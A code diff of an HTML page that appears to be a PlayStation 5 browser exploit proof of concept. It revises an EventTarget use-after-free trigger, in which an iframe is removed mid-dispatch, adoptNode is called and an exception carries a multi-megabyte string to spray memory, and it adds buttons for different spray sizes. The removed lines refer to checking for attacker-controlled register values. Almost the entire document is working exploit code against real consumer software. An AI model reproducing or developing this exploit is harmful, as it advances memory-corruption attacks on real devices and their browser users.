@@ -2,64 +2,68 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 v51 - EventTarget UAF</title>
+<title>PS5 v53 - EventTarget UAF</title>
 <style>
 body { background: #0a0a0a; color: #00ff41; font-family: 'MS Gothic', monospace; padding: 20px; }
-pre { white-space: pre-wrap; word-wrap: break-word; }
+button { display: block; width: 100%; padding: 15px; margin: 5px 0; font-size: 18px; background: #111; color: #00ff41; border: 1px solid #00ff41; cursor: pointer; }
+button:hover { background: #00ff41; color: #000; }
+pre { white-space: pre-wrap; word-wrap: break-word; margin-top: 20px; }
 </style>
 </head>
 <body>
+
+<h3>EventTarget UAF Trigger</h3>
+<p>Click ONE button below. Wait 5 seconds. If browser crashes, UAF is confirmed at that size.</p>
+
+<button onclick="triggerUAF(1)">Trigger 1MB Spray</button>
+<button onclick="triggerUAF(4)">Trigger 4MB Spray</button>
+<button onclick="triggerUAF(8)">Trigger 8MB Spray</button>
+<button onclick="triggerUAF(16)">Trigger 16MB Spray</button>
+<button onclick="triggerUAF(32)">Trigger 32MB Spray (Original size was 64MB)</button>
+
 <pre id="out"></pre>
+
 <script>
 var out = document.getElementById("out");
 function log(m) { out.textContent += m + "\n"; }
 
-log("=== EventTarget UAF Diagnostic ===\n");
-
-try {
-    log("[*] Creating iframe...");
-    const f = document.body.appendChild(document.createElement('iframe'));
+function triggerUAF(mbSize) {
+    log("\n[*] Triggering UAF with " + mbSize + "MB spray...");
+    log("[*] If browser crashes now, UAF is confirmed at " + mbSize + "MB.");
     
-    log("[*] Creating DOM structure...");
-    const a = document.createElement('div');
-    const b = a.appendChild(document.createElement('div'));
-    
-    log("[*] Registering event listeners...");
-    a.addEventListener('a', eval(`(function () {
-        document.adoptNode(a);
-        f.remove();
-        log("[*] Throwing controlled exception to trigger UAF cleanup...");
-        throw {
-            line: 1,
-            column: 1,
-            sourceURL: 'B'.repeat(1024 * 1024 * 2) // 2MB spray instead of 64MB
-        };
-    })`));
-    
-    a.addEventListener('a', () => {});
-    
-    b.addEventListener('a', () => {
-        log("[*] Adopting node to iframe...");
-        f.contentDocument.adoptNode(a);
-    });
-    
-    log("[*] Dispatching event...\n");
-    b.dispatchEvent(new Event('a', { bubbles: true }));
-    
-    log("[+] Event dispatch completed without crash!");
-    log("[*] Checking for memory corruption...");
-    
-    // If we reach here, the UAF might have happened silently
-    // We can try to read properties to see if they are corrupted
-    log("[*] a.parentNode: " + (a.parentNode ? a.parentNode.nodeName : "null"));
-    log("[*] b.parentNode: " + (b.parentNode ? b.parentNode.nodeName : "null"));
-    
-    log("\n=== Diagnostic Complete ===");
-    
-} catch(e) {
-    log("\n[!] EXCEPTION CAUGHT: " + e.message);
-    log("[!] If this is a memory access error, the UAF is alive.");
-    log("[!] Check PS5 crash reporter for 'rax' value. If it contains 0x4242424242424242, we have control.");
+    try {
+        const f = document.body.appendChild(document.createElement('iframe'));
+        const a = document.createElement('div');
+        const b = a.appendChild(document.createElement('div'));
+        
+        // This must be evaluated inside the event listener to maintain context
+        a.addEventListener('a', eval(`(function () {
+            document.adoptNode(a);
+            f.remove();
+            throw {
+                line: 1,
+                column: 1,
+                sourceURL: 'A'.repeat(1024 * 1024 * ${mbSize})
+            };
+        })`));
+        
+        a.addEventListener('a', () => {});
+        
+        b.addEventListener('a', () => {
+            f.contentDocument.adoptNode(a);
+        });
+        
+        b.dispatchEvent(new Event('a', { bubbles: true }));
+        
+        log("[+] Did not crash at " + mbSize + "MB.");
+        log("[*] Try the next size up.");
+        
+    } catch(e) {
+        log("[!] Exception caught: " + e.message);
+        if (e.message.indexOf("memory") !== -1) {
+            log("[!] OOM! Try smaller size.");
+        }
+    }
 }
 </script>
 </body>
